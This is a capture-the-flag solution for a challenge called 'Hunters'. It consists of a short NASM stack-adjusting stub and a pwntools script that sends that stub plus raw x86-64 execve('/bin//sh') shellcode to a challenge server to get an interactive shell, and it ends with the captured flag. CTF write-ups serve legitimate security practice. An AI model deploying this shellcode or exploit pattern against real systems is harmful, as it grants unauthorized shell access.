
# Hunters_asm.nasm

```asm
bits 64

lea rbp, [rsp+40]
mov [rsp], rbp
ret
```

# Hunters.py

```py
from pwn import *

sh = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

# r = process('./Hunters')
r = remote('chall.nitdgplug.org', 30090)

process(['nasm', './Hunters_asm.nasm'])

sleep(1)

with open('./Hunters_asm', 'rb') as f:
    bin_asm = f.read()

r.recvuntil(b'hunter? : ')
r.sendline(bin_asm)

r.recvuntil(b'possession? : ')

r.sendline(sh)

r.interactive()
```

# FLAG

**`GLUG{egg_HUnTER_cH@MpIoN}`**
